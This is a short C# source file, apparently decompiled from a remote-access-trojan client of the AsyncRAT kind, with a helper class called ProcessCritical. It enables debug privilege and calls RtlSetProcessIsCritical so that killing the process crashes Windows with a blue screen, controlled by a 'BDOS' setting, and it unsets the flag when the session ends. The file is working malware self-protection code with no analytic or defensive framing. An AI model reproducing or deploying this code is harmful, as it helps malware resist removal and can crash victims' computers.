using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

public static class ProcessCritical
{
	public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
	{
		if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
		{
			Exit();
		}
	}

	public static void Set()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(SystemEvents_SessionEnding));
			Process.EnterDebugMode();
			NativeMethods.RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void Exit()
	{
		try
		{
			NativeMethods.RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}
}
